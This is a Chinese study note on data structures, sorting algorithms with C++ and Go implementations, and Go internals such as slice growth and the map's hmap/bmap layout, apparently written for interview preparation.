# 数据结构与算法相关

## 线性数据结构

### 数组

优点：构建简单，可以在O(1)的时间内根据数组下标查询元素。

缺点：构建时必须分配连续空间；查询某个元素是否存在时需要遍历，耗费O(n)时间；增删元素时需要耗费O(n)时间

场景：只需要进行访问数据操作时使用数组

### 链表

优点：灵活分配空间；能在O(1)时间内增删元素

缺点：查询需要O(n)时间

场景：数据元素个数不确定，需要经常增删元素，但是不需要频繁查询数据时用链表

### 栈

特点：先进后出

场景：函数调用，反序输出这些场合

### 队列

特点：先进先出

场景：消息队列等

## 树

树在计算机科学中，是一种十分基础的数据结构。几乎所有操作系统都将文件存放在树状结构中；几乎所有的编译器都要实现一个表达式树；文件压缩所用到的哈夫曼算法（Huffman's Algorithm）需要用到树状结构；数据库所使用的B+tree则是一种相当复杂的树状结构。

## 二叉树

二叉树是n个节点的有限集合，该集合或者为空集，或者由一个根节点和两根互不相交的、分别被称为根节点的左子树和右子树组成。

特点：

- 每个节点最多有两个子树，所以二叉树不存在出度大于2的结点
- 左子树和右子树是由顺序的，次序不能颠倒
- 即使树中某节点只有一棵子树，也要区分左子树还是右子树

### 二叉搜索树

可以提供对数时间O(logn)的元素插入和访问，二叉搜索树的放置规则为：任何节点的键值一定大于其左子树中的每个节点的键值，并小于其右子树中的每个节点的键值。

- 应用场景
  - 哈夫曼编码
  - 海量数据并发查询
  - stl容器中的set，multiset，map，multimap内部结构

### 平衡二叉搜索树

平衡的大致意义为：没有任何一个节点过深（深度过大）。

### AVL

- 一种自平衡的二叉查找树
- AVL树中任何节点的两个子树的高度最大差是1，所以是完全平衡的
- 查找、插入和删除的平均和最坏情况都是O(logn)
- 经过修改的二叉树可能失去平衡状态（即左右高差大于1），就不是一棵AVL树了，需要将其进行旋转处理，使之重新平衡

**为什么AVL的高度差不超过1**

- 平衡二叉树是在二叉排序树的基础上引入的，就是为了解决二叉排序树的不平衡性导致的时间复杂度大大下降，不超过1的平衡二叉树就保持住了BST的最好时间复杂度O(logn)

### 红黑树

**规则：**

- 每个节点不是红色就是黑色
- 根节点为黑色
- 如果节点为红色，其子节点必须为黑色
- 任一节点至NULL（树尾端）的任何路径，所含的黑色节点数必须相同

**特点：**

- 只追求近似平衡（节点最大的深度<=最小深度*2）
- 在插入和删除节点时，翻转次数远小于平衡树，因此在需要较多插入删除操作时，使用红黑树更好。
- 在查询操作比较多时，使用平衡树比较好，因为红黑树查询的深度可能会大于平衡二叉树

### B树，B+树

- 一种多路查找树
- B树中所有节点都有指向记录的指针，在非叶子节点种出现的索引项不会出现在叶子节点中；B+树种**只有叶子节点**会带有指向记录的指针。
- B+树的所有叶子节点通过双向链表连接在一起；B树不连接
- B树优点：对于在内部节点的数据，可以直接获得，不必根据叶子节点来定位
- B+树优点：1非叶子节点不会带上指向记录的指针，这样一个块中就可以容纳更多的索引项；2叶子节点通过指针连接在一起，可以横向遍历。

## heap

堆实际是一个完全二叉树，所有元素都可以将其保存在一个vector之中，heap没有迭代器。

max-heap的最大值在根节点，即在vector的第一个元素；min-heap的最小值在根节点，即在vector的第一个元素。

- 插入：先将元素插入到vector的尾部，然后进行上溯程序，将新节点与其父节点比较，如果键值大于父节点，就对换位置，否则一直上溯，直到不需对换或者到达根节点。
- 弹出：弹出操作取走根节点（实现中其实时将其移至底层容器vector的最后一个元素）之后，为了满了完全二叉树的特性，必须将最下一层最右边的叶子节点拿掉，然后为其找一个适当的位置。
  - 执行下溯操作，即将根节点填入根节点，然后将它与它的两个子节点作比较，并于较大的键值对调位置，一直下放到他的键值大于左右两个子节点或者到达叶子节点为止。

## hash

### 哈希表

- 哈希表（HashTable）也叫散列表，是根据关键码值（key-value）而直接访问的数据结构
- 可以把关键码值**映射**到表中的一个位置来访问记录，加快查找的速度
- 这个映射函数叫做**哈希函数**（散列函数），存放记录的数组叫做哈希表
- `storage location(bucket)=H(key)`，`H()`被称为哈希函数（散列函数），采用哈希技术将记录存储在一块连续的存储空间

### 哈希表的存取

- 存值：把key通过一个固定的哈希函数转换为一个整形数字，然后对该数字长度进行取余，取余结果当作数组的下标，将value存储在以该数字为下标的数组空间中
- 取值：再次使用哈希函数将key转换为对应的数组下标，并定位到哈希表中获取value

### 哈希的应用

- 加密算法：把不同长度的信息转换为杂乱的128位的编码（MD5）
- 查找：当知道key值之后，可以直接计算出元素在集合中的位置

### 常见的哈希函数

- 直接定址法：取关键字key或者关键字中的某个线性函数值作为散列地址，即`H(key)=key or H(key)=a*key+b; a,b=常数`
- 除留余数法：取关键字key被某个不大于哈希表大小m的数p求余
- 数字分析法：当关键字位数大于地址位数，对关键字的各位分布进行分析，选出分布均匀的任意几位作为哈希地址
- 平方取中法：计算关键字值的平方，然后取平均值中间几位作为哈希地址
- 折叠法：将关键字分为位数相同的及部分，然后取这及部分的叠加和（进位舍去）作为哈希地址

### 哈希冲突

- 不同关键字通过相同哈希函数计算处相同的哈希地址，这种现象称为哈希冲突

- 处理方法：
  - 链地址法：key相同的使用单链表连接（数组+链表）
  - 开放定址法：
    - 线性探测法：放到`H(key)`的下一个位置，`Hi=(H(key)+i)%m`
    - 二次探测法：放到计算位置后偏移量（1，2，3...）的二次方地址处
    - 随机探测法：`Hi=(H(key)+random)%m`
  
- **STL中通常使用链地址法解决哈希冲突**，使用的节点结构体为

- ```c
  template <class Value>
  struct __hashtable_node{
  	__hashtable_node* next;
  	Value val;
  };
  ```

### STL中的hash表

stl中的hash_table是用于实现无序关联容器的底层结构。

其中哈希表里的元素节点被称为桶（bucket），桶内维护的是链表，但不是STL中的链表，而是自行维护的一个node。bucket聚合体也即hash_table使用vector实现。

- **hash_table**扩容时发生什么：
  - 创建一个新桶，该桶是原来桶两倍大最接近的质数（判断质数：用n除以2到`sqrt(n)`的所有整数）
  - 将原来桶里的数通过指针的转换，插入到新桶里
  - 通过swap函数将新桶和旧桶交换，销毁旧桶

#### hash_map和map的区别

- map优点：有序，底层为红黑树，可以使map的很多操作以O(logN)的时间复杂度完成
- map缺点：空间占用高，因为内部使用RB-tree，虽然提高了运行效率，但每个节点都存储了父节点、孩子节点和颜色。
- map适用于：对于有顺序要求的场合
- hash_map优点：内部实现了哈希表，查找速度很快
- hash_map缺点：哈希表建立比较耗费时间
- hash_map适用于：对于查找问题，速度很高效

### 一致性哈希

一致性哈希（Distribute Hash Table, DHT）是一种哈希分布方式，其目的是为了克服传统哈希分布在服务器节点数量变化时大量数据迁移的问题。

#### 基本原理

将哈希空间`[0,2^n-1], n=32`看成一个哈希环，每个服务器节点都配置到哈希环上，每个数据对象通过哈希取模得到哈希值之后，存放到哈希环中**顺时针方向第一个大于该哈希值的服务器节点**上。如下图将数据对象C插入到节点中，计算`Hash()%2^32`会得到一个节点，此时他的顺时针方向第一个服务器节点`Node C`，则将它放入节点`Node C`中。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-20\consisitenctHash1.png" alt="img" style="zoom:70%;" />
</div>


一致性哈希在增加（集群扩容）或者删除服务器节点（某节点宕机）时只会影响到哈希环中**相邻的节点**。例如下图中新增服务器节点X，只需要将在节点`Node B`和节点`Node X`之间的原本属于`Node C`的数据对象C重新分配即可，对于其他数据对象A,B,D均没有影响。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-20\consistencyHash2.png" alt="img" style="zoom:70%;" />
</div>
#### 一致性哈希中的数据倾斜问题

当一致性Hash算法中的服务器节点过少时，容易因为分布不均匀而造成数据倾斜（被缓存的对象大部分集中缓存在某一台服务器上）的问题。如图中，只有两台机器`D0, D1`，这两台机器离的很近，那么顺时针第一个机器节点上将存有大量的数据；第二台机器上的数据很少。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-20\node12.png" alt="img" style="zoom:70%;" />
</div>


- 使用**虚拟节点**解决数据倾斜问题，也就是每台机器节点会进行多次哈希，最终每个机器节点在哈喜欢上会有多个虚拟节点存在，使用这种方式来大大削弱甚至避免数据倾斜问题。同时数据定位算法不变，只是多了一步**虚拟节点到实际节点的映射**，例如定位到“D1#1”、“D1#2”、“D1#3”三个虚拟节点的数据均定位到 D1 上。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-01-20\virtualnode.png" alt="img" style="zoom:70%;" />
</div>


## 排序

| 排序算法                                                     | 平均时间复杂度 | 最差时间复杂度 | 空间复杂度 | 数据对象稳定性       |
| ------------------------------------------------------------ | -------------- | -------------- | ---------- | -------------------- |
| [冒泡排序](https://github.com/huihut/interview/blob/master/Algorithm/BubbleSort.h) | O(n2)          | O(n2)          | O(1)       | 稳定                 |
| [选择排序](https://github.com/huihut/interview/blob/master/Algorithm/SelectionSort.h) | O(n2)          | O(n2)          | O(1)       | 数组不稳定、链表稳定 |
| [插入排序](https://github.com/huihut/interview/blob/master/Algorithm/InsertSort.h) | O(n2)          | O(n2)          | O(1)       | 稳定                 |
| [快速排序](https://github.com/huihut/interview/blob/master/Algorithm/QuickSort.h) | O(n*log2n)     | O(n2)          | O(log2n)   | 不稳定               |
| [堆排序](https://github.com/huihut/interview/blob/master/Algorithm/HeapSort.cpp) | O(n*log2n)     | O(n*log2n)     | O(1)       | 不稳定               |
| [归并排序](https://github.com/huihut/interview/blob/master/Algorithm/MergeSort.h) | O(n*log2n)     | O(n*log2n)     | O(n)       | 稳定                 |
| [希尔排序](https://github.com/huihut/interview/blob/master/Algorithm/ShellSort.h) | O(n*log2n)     | O(n2)          | O(1)       | 不稳定               |
| [桶排序](https://github.com/huihut/interview/blob/master/Algorithm/BucketSort.cpp) | O(n)           | O(n)           | O(m)       | 稳定                 |
| [基数排序](https://github.com/huihut/interview/blob/master/Algorithm/RadixSort.h) | O(k*n)         | O(n2)          |            | 稳定                 |

### 堆排序

```c++
#include <iostream>
#include <vector>
using namespace std;

void max_heapify(vector<int>& arr, int start, int end){
    int dad = start;				// 建立父节点和子节点下标
    int son = dad * 2 + 1;
    while(son <= end){				// 如果子节点下标在范围内才进行比较
        if(son + 1 <= end && arr[son] < arr[son+1])		// 比较两个子节点，选择最大的
            son ++;
        if(arr[dad] > arr[son])		// 将父节点和最大子节点比较，如果大于则表示调整完毕，跳出
            return;
        else{
            swap(arr[dad], arr[son]);	// 如果小于就交换内容
            dad = son;
            son = dad * 2 + 1;
        }
    }
}

void heap_sort(vector<int>& arr){
    int len = arr.size();
    for(int i = len / 2 - 1; i >= 0; i --)
        max_heapify(arr, i, len-1);		// 先将最大的上溯到0位置
    for(int i = len-1; i > 0; i--){
        swap(arr[0], arr[i]);			// 将0位置元素（最大的）和当前循环的最后一个元素交换
        max_heapify(arr, 0, i-1);		// 对剩下的继续进行最大堆调整
    }
}
```

# 排序算法

## 选择排序

**原理**：遍历数组， 从中选择最小元素，将它与数组的第一个元素交换位置。继续从数组剩下的元素中选择出最小的元素，将它与数组的第二个元素交换位置。循环以上过程，直到将整个数组排序。

**时间复杂度分析**：$O(N^{2})$。选择排序大约需要 $N^{2}/2$ 次比较和 $N$ 次交换，它的运行时间与输入无关，这个特点使得它对一个已经排序的数组也需要很多的比较和交换操作。

**实现**：

```go
// 选择排序 (selection sort)
package sorts

func SelectionSort(arr []int) []int {

    for i := 0; i < len(arr); i++ {
        min := i
        for j := i + 1; j < len(arr); j++ {
            if arr[j] < arr[min] {
                min = j
            }
        }

        tmp := arr[i]
        arr[i] = arr[min]
        arr[min] = tmp
    }
    return arr
}
```

## 冒泡排序

**原理**：遍历数组，比较并将大的元素与下一个元素交换位置， 在一轮的循环之后，可以让未排序i的最大元素排列到数组右侧。在一轮循环中，如果没有发生元素位置交换，那么说明数组已经是有序的，此时退出排序。

**时间复杂度分析**： $O(N^{2})$

**实现**:

```go
// 冒泡排序 (bubble sort)
package sorts

func bubbleSort(arr []int) []int {
    swapped := true
    for swapped {
        swapped = false
        for i := 0; i < len(arr)-1; i++ {
            if arr[i+1] < arr[i] {
                arr[i+1], arr[i] = arr[i], arr[i+1]
                swapped = true
            }
        }
    }
    return arr
}
```

## 插入排序

**原理**：数组先看成两部分，排序序列和未排序序列。排序序列从第一个元素开始，该元素可以认为已经被排序。遍历数组， 每次将扫描到的元素与之前的元素相比较，插入到有序序列的适当位置。

**时间复杂度分析**：插入排序的时间复杂度取决于数组的排序序列，如果数组已经部分有序了，那么未排序元素较少，需要的插入次数也就较少，时间复杂度较低。

- 平均情况下插入排序需要 $N^{2}/4$ 次比较以及 $N^{2}/4$ 次交换；
- 最坏的情况下需要 $N^{2}/2$ 比较以及 $N^{2}/2$ 次交换，最坏的情况是数组都是未排序序列（倒序）的；
- 最好的情况下需要 $ N-1$ 次比较和 0 次交换，最好的情况就是数组已经是排序序列。

**实现**：

```go
// 插入排序 (insertion sort)
package sorts

func InsertionSort(arr []int) []int {
    for currentIndex := 1; currentIndex < len(arr); currentIndex++ {
        temporary := arr[currentIndex]
        iterator := currentIndex
        for ; iterator > 0 && arr[iterator-1] >= temporary; iterator-- {
            arr[iterator] = arr[iterator-1]
        }
        arr[iterator] = temporary
    }
    return arr
}
```

## 希尔排序

**原理**：希尔排序，也称递减增量排序算法，实质是插入排序的优化（*分组插入排序*）。对于大规模的数组，插入排序很慢，因为它只能交换相邻的元素位置，每次只能将未排序序列数量减少 1。希尔排序的出现就是为了解决插入排序的这种局限性，通过交换不相邻的元素位置，使每次可以将未排序序列的减少数量变多。

希尔排序使用插入排序对间隔 d 的序列进行排序。通过不断减小 d，最后令 d=1，就可以使得整个数组是有序的。

**时间复杂度**：$O(dN*M)$， M 表示已排序序列长度，d 表示间隔， 即 N 的若干倍乘于递增序列的长度

**实现**：

```go
// 希尔排序 (shell sort)
package sorts

func ShellSort(arr []int) []int {
    for d := int(len(arr) / 2); d > 0; d /= 2 { 
        for i := d; i < len(arr); i++ {
            for j := i; j >= d && arr[j-d] > arr[j]; j -= d {
                arr[j], arr[j-d] = arr[j-d], arr[j]
            }
        }
    }
    return arr
}
```

## 归并排序

**原理**： 将数组分成两个子数组， 分别进行排序，然后再将它们归并起来（自上而下）。

**具体算法描述**：先考虑合并两个有序数组，基本思路是比较两个数组的最前面的数，谁小就先取谁，取了后相应的指针就往后移一位。然后再比较，直至一个数组为空，最后把另一个数组的剩余部分复制过来即可。

再考虑递归分解，基本思路是将数组分解成`left`和`right`，如果这两个数组内部数据是有序的，那么就可以用上面合并数组的方法将这两个数组合并排序。如何让这两个数组内部是有序的？可以二分，直至分解出的小组只含有一个元素时为止，此时认为该小组内部已有序。然后合并排序相邻二个小组即可。

归并算法是**分治法** 的一个典型应用， 所以它有两种实现方法：

1. 自上而下的递归： 每次将数组对半分成两个子数组再归并（分治）
2. 自下而上的迭代：先归并子数组，然后成对归并得到的子数组

**时间复杂度分析**: $O(N\log N)$

**实现**：

```go
// 归并排序 (merge sort)
package sorts

func merge(a []int, b []int) []int {

    var r = make([]int, len(a)+len(b))
    var i = 0
    var j = 0

    for i < len(a) && j < len(b) {

        if a[i] <= b[j] {
            r[i+j] = a[i]
            i++
        } else {
            r[i+j] = b[j]
            j++
        }

    }

    for i < len(a) {
        r[i+j] = a[i]
        i++
    }
    for j < len(b) {
        r[i+j] = b[j]
        j++
    }

    return r

}

// Mergesort 合并两个数组
func Mergesort(items []int) []int {

    if len(items) < 2 {
        return items

    }

    var middle = len(items) / 2
    var a = Mergesort(items[:middle])
    var b = Mergesort(items[middle:])
    return merge(a, b)

}
```

## 快速排序

**原理**：快速排序也是分治法的一个应用，先随机拿到一个基准 pivot，通过一趟排序将数组分成两个独立的数组，左子数组小于或等于 pivot，右子数组大于等于 pivot。 然后可在对这两个子数组递归继续以上排序，最后使整个数组有序。

**具体算法描述**：

1. 从数组中挑选一个切分元素，称为“基准” （pivot）
2. 排序数组，把所有比基准值小的元素排到基准前面，所有比基准值大的元素排到基准后面（相同元素不对位置做要求）。这个排序完成后，基准就排在数组的中间位置。这个排序过程称为“分区” （partition）
3. 递归地把小于基准值元素的子数组和大于基准值的子数组排序

**空间复杂度分析**：快速排序是原地排序，不需要辅助数据，但是递归调用需要辅助栈，最好情况下是递归 $\log 2N$ 次，所以空间复杂度为 $O(\log 2N)$，最坏情况下是递归 $N-1$次，所以空间复杂度是 $O(N)$。

**时间复杂度分析**：

- 最好的情况是每次基准都正好将数组对半分，这样递归调用最少，时间复杂度为 $O(N \log N)$
- 最坏的情况是每次分区过程，基准都是从最小元素开始，对应时间复杂度为 $O(N^{^{2}})$

**算法改进**：

1. 分区过程中更合理地选择基准（pivot）。直接选择分区的第一个或最后一个元素做 pivot 是不合适的，对于已经排好序，或者接近排好序的情况，会进入最差情况，时间复杂度为 $O(N^{2})$
2. 因为快速排序在小数组中也会递归调用自己，对于小数组，插入排序比快速排序的性能更好，因此在小数组中可以切换到插入排序
3. 更快地分区（三向切分快速排序）：对于有大量重复元素的数组，可以将数组切分为三部分，分别对应小于 pivot、等于 pivot 和大于 pivot 切分元素

**实现**：

```go
// 三向切分快速排序 (quick sort)
package sorts

import (
    "math/rand"
)

func QuickSort(arr []int) []int {

    if len(arr) <= 1 {
        return arr
    }

    pivot := arr[rand.Intn(len(arr))]

    lowPart := make([]int, 0, len(arr))
    highPart := make([]int, 0, len(arr))
    middlePart := make([]int, 0, len(arr))

    for _, item := range arr {
        switch {
        case item < pivot:
            lowPart = append(lowPart, item)
        case item == pivot:
            middlePart = append(middlePart, item)
        case item > pivot:
            highPart = append(highPart, item)
        }
    }

    lowPart = QuickSort(lowPart)
    highPart = QuickSort(highPart)

    lowPart = append(lowPart, middlePart...)
    lowPart = append(lowPart, highPart...)

    return lowPart
}
```

## 堆排序

**原理**：堆排序是利用“堆积”（heap）这种数据结构的一种排序算法。因为堆是一个近似完全二叉树结构，满足子节点的键值或索引小于（或大于）它的父节点。

**具体算法描述**：

1. 将待排序数组构建成大根堆，这个堆为初始的无序区
2. 将堆顶元素 $R_{1}$ 与最后一个元素 $R_{n}$ 交换，此时得到新的无序区（$R_{1},R_{2},...R_{n-1}$）和新的有序区（$R_{n}$），并且满足 $R_{1,2,...n-1}<= R_{n}$
3. 由于交换后新的堆顶 $R_{1}$可能违反堆的性质，需要对当前无序区调整为新堆，然后再次将 $R_{1}$与无序区最后一个元素交换，得到新的无序区 $R_{1},R_{2}...R_{n-2}$ 和新的有序区$R_{n-1},R_{n}$。不断重复此过程直到有序区的元素个数为$n-1$，则整个排序过程完成

**时间复杂度分析**：一个堆的高度为 $\log N$，因此在堆中插入元素和删除最大元素的时间复杂度为 $O(\log N)$。堆排序会对 N 个节点进行下沉操作，因为时间复杂度为 $O(N \log N)$

**实现**：

```go
// 堆排序 (heap sort)
package sorts

type maxHeap struct {
    slice    []int
    heapSize int
}

func buildMaxHeap(slice []int) maxHeap {
    h := maxHeap{slice: slice, heapSize: len(slice)}
    for i := len(slice) / 2; i >= 0; i-- {
        h.MaxHeapify(i)
    }
    return h
}

func (h maxHeap) MaxHeapify(i int) {
    l, r := 2*i+1, 2*i+2
    max := i

    if l < h.size() && h.slice[l] > h.slice[max] {
        max = l
    }
    if r < h.size() && h.slice[r] > h.slice[max] {
        max = r
    }
    if max != i {
        h.slice[i], h.slice[max] = h.slice[max], h.slice[i]
        h.MaxHeapify(max)
    }
}

func (h maxHeap) size() int { return h.heapSize } 

func HeapSort(slice []int) []int {
    h := buildMaxHeap(slice)
    for i := len(h.slice) - 1; i >= 1; i-- {
        h.slice[0], h.slice[i] = h.slice[i], h.slice[0]
        h.heapSize--
        h.MaxHeapify(0)
    }
    return h.slice
}
```

## 算法复杂度比较

下面是各排序算法的复杂度和稳定性比较：

| 排序算法 | 时间复杂度（平均） | 时间复杂度（最好） | 时间复杂度（最坏） | 空间复杂度    | 稳定性 | 备注                     |
| -------- | ------------------ | ------------------ | ------------------ | ------------- | ------ | ------------------------ |
| 选择排序 | $O(N^{2})$         | $O(N^{2})$         | $O(N^{2})$         | $O(1)$        | 不稳定 |                          |
| 冒泡排序 | $O(N^{2})$         | $O(N)$             | $O(N^{2})$         | $O(1)$        | 稳定   |                          |
| 插入排序 | $O(N^{2})$         | $O(N)$             | $O(N^{2})$         | $O(1)$        | 稳定   | 时间复杂度和初始顺序有关 |
| 希尔排序 | $O(N^{1.3})$       | $O(N)$             | $O(N^{2})$         | $O(1)$        | 不稳定 | 改进版插入排序           |
| 归并排序 | $O(N \log N)$      | $O(N \log N)$      | $O(N \log N)$      | $O(N)$        | 稳定   |                          |
| 快速排序 | $O(N \log N)$      | $O(N \log N)$      | $O(N^{2})$         | $O(N \log N)$ | 不稳定 |                          |
| 堆排序   | $O(N \log N)$      | $O(N \log N)$      | $O(N \log N)$      | $O(1)$        | 不稳定 | 无法利用局部性原理       |

注：

- 稳定：如果 a 原本在 b 前面，而 a=b，排序之后 a 仍然在 b 的前面。
- 不稳定：如果 a 原本在 b 的前面，而 a=b，排序之后 a 可能会出现在 b 的后面。

# Go语言面试

## Go编译原理

Go 的编译器在逻辑上可以被分成四个阶段：

1. 词法与语法分析。
2. 类型检查和 AST 转换。
3. 通用 SSA（中间代码） 生成。
4. 最后的机器代码生成。

### 词法与语法分析

所有的编译过程其实都是从解析代码的源文件开始的，词法分析的作用就是解析源代码文件，它将文件中的字符串序列转换成 Token 序列，方便后面的处理和解析，我们一般会把执行词法分析的程序称为词法解析器（lexer）。

而语法分析的输入是词法分析器输出的 Token 序列，语法分析器会按照顺序解析 Token 序列，该过程会将词法分析生成的 Token 按照编程语言定义好的文法（Grammar）自下而上或者自上而下的规约，每一个 Go 的源代码文件最终会被归纳成一个 SourceFile。

### 类型检查

当拿到一组文件的抽象语法树之后，Go 语言的编译器会对语法树中定义和使用的类型进行检查，类型检查会按照以下的顺序分别验证和处理不同类型的节点：

1. 常量、类型和函数名及类型；
2. 变量的赋值和初始化；
3. 函数和闭包的主体；
4. 哈希键值对的类型；
5. 导入函数体；
6. 外部的声明；

### 中间代码生成

当我们将源文件转换成了抽象语法树、对整棵树的语法进行解析并进行类型检查之后，就可以认为当前文件中的代码不存在语法错误和类型错误的问题了，Go 语言的编译器就会将输入的抽象语法树转换成中间代码。

在类型检查之后，编译器会通过 `cmd/compile/internal/gc.compileFunctions`编译整个 Go 语言项目中的全部函数，这些函数会在一个编译队列中等待几个 Goroutine 的消费，并发执行的 Goroutine 会将所有函数对应的抽象语法树转换成中间代码。

### 机器码生成

Go 语言源代码的 [`src/cmd/compile/internal`](https://github.com/golang/go/tree/master/src/cmd/compile/internal) 目录中包含了很多机器码生成相关的包，不同类型的 CPU 分别使用了不同的包生成机器码。

tips: go语言可以在 Web 浏览器上生成一种具有高可移植性的目标语言，Go 语言的编译器既然能够生成 Wasm 格式的指令，那么就能够运行在常见的主流浏览器中。

## Go数据结构

### 数组

数组在初始化时，会做如下的优化：

1. 当元素数量小于或者等于 4 个时，会直接将数组中的元素放置在栈上；
2. 当元素数量大于 4 个时，会将数组中的元素放置到静态区并在运行时取出；

### 切片

**简介：**Go语言中的切片是围绕动态数组的概念构建的，可以按需自动增长和缩小。切片的动态增长是通过内置函数append来实现的，还可以通过对切片再次切片来缩小一个切片的大小。因为切片在内存中是连续的，所以切片还能获得索引、迭代以及垃圾回收优化的好处。

**底层实现：**切片的底层实现包含3个字段：**指向底层数组的指针**、**切片访问的元素的个数（长度）**、**切片允许增长到的元素的个数（容量）**。基于同一个数组或切片创建的不同切片都共享同一个底层数组。如果一个切片修改了该底层数组的共享部分，其他切片和原始数组或切片都能感知到。

**nil和空切片**：用`var s []int`声明的切片如果未经初始化，就是nil切片。空切片是用make或字面量创建的切片，`s := make([]int, 0)或者s := []int{}`。空切片在底层数组包含0个元素，也没有分配任何存储空间。不管是空切片还是nil切片，对其调用函数append、len和cap的效果都是一样的。

#### Go的Slice如何扩容

通常我们在对slice进行append等操作时，可能会造成slice的自动扩容。

其扩容时的大小增长规则是：

- 如果切片的容量小于1024个元素，那么扩容的时候slice的cap就翻番，乘以2；一旦元素个数超过1024个元素，增长因子就变成1.25，即每次增加原来容量的四分之一。
- 如果扩容之后，还没有触及原数组的容量，那么，切片中的指针指向的位置，就还是原数组，如果扩容之后，超过了原数组的容量，那么，Go就会开辟一块新的内存，把原来的值拷贝过来，这种情况丝毫不会影响到原数组。

#### nil切片和空切片的区别

- **nil切片和空切片指向的地址不一样。nil空切片引用数组指针地址为0（无指向任何实际地址）**
- **空切片的引用数组指针地址是有的，且固定为一个值**
- nil切片和空切片最大的区别在于**指向的数组引用地址是不一样的**。
- **所有的空切片指向的数组引用地址都是一样的**

#### 拷贝大切片一定比小切片代价大吗？

并不是，所有切片的大小相同；**三个字段**（一个 uintptr，两个int）。切片中的第一个字是指向切片底层数组的指针，这是切片的存储空间，第二个字段是切片的长度，第三个字段是容量。将一个 slice 变量分配给另一个变量只会复制三个机器字。所以 **拷贝大切片跟小切片的代价应该是一样的**。

#### slice的深拷贝和浅拷贝

浅拷贝就是指slice变量的赋值操作。

深拷贝就是指使用内置的copy函数来拷贝两个slice。

### 哈希表

#### 基本原理

**简介**：golang的map是hashmap，是使用数组+链表的形式实现的，使用拉链法消除hash冲突。

**详解**：golang的map由两种重要的结构，hmap和bmap，主要就是hmap中包含一个指向bmap数组的指针，key经过hash函数之后得到一个数，这个数低位用于选择bmap(当作bmap数组指针的下表)，高位用于放在bmap的[8]uint8数组中，用于快速试错。然后一个bmap可以指向下一个bmap(拉链)。

**总结**：Golang通过hashtop快速试错加快了查找过程，利用空间换时间的思想解决了扩容的问题，利用将8个key(8个value)依次放置减少了padding空间等等。

#### map内存模型

在源码中，表示 map 的结构体是 hmap，它是 hashmap 的“缩写”：

```
// A header for a Go map.
type hmap struct {
    // 元素个数，调用 len(map) 时，直接返回此值
    count     int
    flags     uint8
    // buckets 的对数 log_2
    B         uint8
    // overflow 的 bucket 近似数
    noverflow uint16
    // 计算 key 的哈希的时候会传入哈希函数
    hash0     uint32
    // 指向 buckets 数组，大小为 2^B
    // 如果元素个数为0，就为 nil
    buckets    unsafe.Pointer
    // 扩容的时候，buckets 长度会是 oldbuckets 的两倍
    oldbuckets unsafe.Pointer
    // 指示扩容进度，小于此地址的 buckets 迁移完成
    nevacuate  uintptr
    extra *mapextra // optional fields
}
```

说明一下，`B` 是 buckets 数组的长度的对数，也就是说 buckets 数组的长度就是 2^B。bucket 里面存储了 key 和 value，后面会再讲。

buckets 是一个指针，最终它指向的是一个结构体：

```
type bmap struct {
    tophash [bucketCnt]uint8
}
```

但这只是表面(src/runtime/hashmap.go)的结构，编译期间会给它加料，动态地创建一个新的结构：

```
type bmap struct {
    topbits  [8]uint8
    keys     [8]keytype
    values   [8]valuetype
    pad      uintptr
    overflow uintptr
}
```

`bmap` 就是我们常说的“桶”，桶里面会最多装 8 个 key，这些 key 之所以会落入同一个桶，是因为它们经过哈希计算后，哈希结果是“一类”的。在桶内，又会根据 key 计算出来的 hash 值的高 8 位来决定 key 到底落入桶内的哪个位置（一个桶内最多有8个位置）。

来一个整体的图：

<img src="https://golang.design/go-questions/map/assets/0.png" alt="hashmap bmap" style="zoom: 25%;" />

**当 map 的 key 和 value 都不是指针，并且 size 都小于 128 字节的情况下，会把 bmap 标记为不含指针，这样可以避免 gc 时扫描整个 hmap。但是，我们看 bmap 其实有一个 overflow 的字段，是指针类型的，破坏了 bmap 不含指针的设想，这时会把 overflow 移动到 extra 字段来。**

```
type mapextra struct {
    // overflow[0] contains overflow buckets for hmap.buckets.
    // overflow[1] contains overflow buckets for hmap.oldbuckets.
    overflow [2]*[]*bmap

    // nextOverflow 包含空闲的 overflow bucket，这是预分配的 bucket
    nextOverflow *bmap
}
```

bmap 是存放 k-v 的地方，我们把视角拉近，仔细看 bmap 的内部组成。

<img src="https://golang.design/go-questions/map/assets/1.png" alt="bmap struct" style="zoom: 25%;" />

上图就是 bucket 的内存模型，`HOB Hash` 指的就是 top hash。 注意到 key 和 value 是各自放在一起的，并不是 `key/value/key/value/...` 这样的形式。源码里说明这样的好处是在某些情况下可以省略掉 padding 字段，节省内存空间。

例如，有这样一个类型的 map：

```
map[int64]int8
```

如果按照 `key/value/key/value/...` 这样的模式存储，那在每一个 key/value 对之后都要额外 padding 7 个字节；而将所有的 key，value 分别绑定到一起，这种形式 `key/key/.../value/value/...`，则只需要在最后添加 padding。

每个 bucket 设计成最多只能放 8 个 key-value 对，如果有第 9 个 key-value 落入当前的 bucket，那就需要再构建一个 bucket ，通过 `overflow` 指针连接起来。

#### 创建map

从语法层面上来说，创建 map 很简单：

```
ageMp := make(map[string]int)
// 指定 map 长度
ageMp := make(map[string]int, 8)

// ageMp 为 nil，不能向其添加元素，会直接panic
var ageMp map[string]int
```

通过汇编语言可以看到，实际上底层调用的是 `makemap` 函数，主要做的工作就是初始化 `hmap` 结构体的各种字段，例如计算 B 的大小，设置哈希种子 hash0 等等。

```go
func makemap(t *maptype, hint int64, h *hmap, bucket unsafe.Pointer) *hmap {
    // 省略各种条件检查...

    // 找到一个 B，使得 map 的装载因子在正常范围内
    B := uint8(0)
    for ; overLoadFactor(hint, B); B++ {
    }

    // 初始化 hash table
    // 如果 B 等于 0，那么 buckets 就会在赋值的时候再分配
    // 如果长度比较大，分配内存会花费长一点
    buckets := bucket
    var extra *mapextra
    if B != 0 {
        var nextOverflow *bmap
        buckets, nextOverflow = makeBucketArray(t, B)
        if nextOverflow != nil {
            extra = new(mapextra)
            extra.nextOverflow = nextOverflow
        }
    }

    // 初始化 hamp
    if h == nil {
        h = (*hmap)(newobject(t.hmap))
    }
    h.count = 0
    h.B = B
    h.extra = extra
    h.flags = 0
    h.hash0 = fastrand()
    h.buckets = buckets
    h.oldbuckets = nil
    h.nevacuate = 0
    h.noverflow = 0

    return h
}
```

注意，这个函数返回的结果：`*hmap`，它是一个指针，而我们之前讲过的 `makeslice` 函数返回的是 `Slice` 结构体：

```go
func makeslice(et *_type, len, cap int) slice
```

